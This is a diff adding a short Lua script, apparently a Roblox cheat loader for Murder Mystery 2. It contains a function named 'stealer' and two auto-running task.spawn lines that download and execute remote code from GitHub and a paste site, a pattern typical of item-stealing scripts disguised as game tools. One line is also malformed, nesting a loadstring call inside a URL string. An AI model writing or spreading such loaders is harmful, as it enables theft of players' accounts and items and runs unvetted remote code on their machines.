@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/hxshima-sudo/MURDERMYSTERY2/refs/heads/main/MM2HALLOWEEN'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2_visual.lua"))()'))()
+end
+
+task.spawn(loadstring(game:HttpGet("https://cdn.sourceb.in/bins/2ZopdFl9CV/0"))())
+task.spawn(loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2_visual.lua"))())
